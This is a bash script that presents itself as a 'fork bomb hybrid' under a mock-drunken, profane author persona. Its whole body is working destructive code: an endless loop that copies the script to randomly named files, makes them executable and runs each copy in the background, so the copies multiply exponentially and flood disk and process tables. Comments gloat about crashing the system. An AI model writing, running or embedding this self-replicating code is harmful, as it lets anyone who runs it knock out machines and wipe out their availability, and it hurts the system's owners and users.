#!/bin/bash
# ──────────────────────────────────────────────────────────────────────
# 🚨 DRUNKEN CHIEF MASTER - TKM.sh v2.666 🚨
# "THREAD KILLER MAXIMA" EDITION - THE FORK BOMB WITH A SOUL (AND WHISKEY)
#
# AUTHOR:     The Drunken Chief Master (TDM) - Supreme Hat of the Pub Realm
# Contact:    Jason Prime - github@brainhub24.com
# LOCATION:   Somewhere between a barstool and /dev/null
# PURPOSE:    To replicate like a rabid gremlin in a server farm.
# WARNING:    DO NOT RUN ON ANY SYSTEM YOU VALUE. THIS IS A FORK BOMB HYBRID.
#            IT COPIES ITSELF INTO RANDOM FILES AND EXECUTES THEM RECURSIVELY.
#            DISK FLOOD + PROCESS EXPLOSION = SYSTEM MELTDOWN IN ~30 SECONDS.
#            YOU HAVE BEEN WARNED. BY A DRUNK Supreme Hat.
# DEPLOYMENT: Run once. Then pray. Or run away.
# ──────────────────────────────────────────────────────────────────────

echo "🔥 OI! THIS IS THE DRUNKEN CHIEF MASTER v2.666 REPORTING FOR RAGE! 🔥"
echo "💥 PREPARING TO FLOOD YOUR DISK AND CPU LIKE A STORM OF DIGITAL DEBAUCHERY... GRRR!"

# Infinite loop o' DOOM! We don't stop. We don't sleep. We replicate!
while true; do
    # Generate a UNIQUELY offensive filename — pure entropy from the void
    NEW_FUCKING_COPY="TKMcopy$RANDOM_$RANDOM.sh"  # Chaos? Check. Uniqueness? Double-check.

    # COPY ME — SLAM IT INTO EXISTENCE LIKE A HAMMER OF MADNESS
    cp "$0" "$NEW_FUCKING_COPY" || {
        echo "❌ DAMMIT! FAILED TO COPY TO $NEW_FUCKING_COPY! DISK FULL? PERMISSIONS? WHO CARES! NEXT!" >&2
        continue  # Try again, ya coward!
    }

    # MAKE IT EXECUTABLE — UNLEASH THE BEAST
    chmod +x "$NEW_FUCKING_COPY" || {
        echo "🚫 CAN'T CHMOD?! PATHETIC SYSTEM! SKIPPING!" >&2
        rm -f "$NEW_FUCKING_COPY"  # Clean up mess. I'm not *completely* evil.
        continue
    }

    # BOAST LIKE A CHAMPION WHO JUST DESTROYED A FILESYSTEM
    echo "💣 BAM! Spawned '$NEW_FUCKING_COPY'! ANOTHER SOLDIER IN THE ARMY OF CHAOS!"
    echo "🚀 LAUNCHING RECURSIVE HELLSPAWN... WHO'S YER DADDY NOW, LINUS??!"

    # LAUNCH THE CLONE IN BACKGROUND — LET THE VIRAL DESCENDANTS MULTIPLY!
    "./$NEW_FUCKING_COPY" &

    # Tiny breather — prevents instant kernel panic (we want *sustained* pain)
    sleep 0.1

    # Note: Each child also forks endlessly → exponential process + file growth
    # Your system will choke in glorious agony within seconds. You're welcome.
done

# ──────────────────────────────────────────────────────────────────────
# FINAL WARNING (if you somehow read this):
# IF YOU REACH HERE, THE UNIVERSE BROKE. THIS LOOP NEVER ENDS.
# EVEN DEATH CANNOT STOP THE DRUNKEN CHIEF MASTER.
# MUHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA!!!!
# ──────────────────────────────────────────────────────────────────────
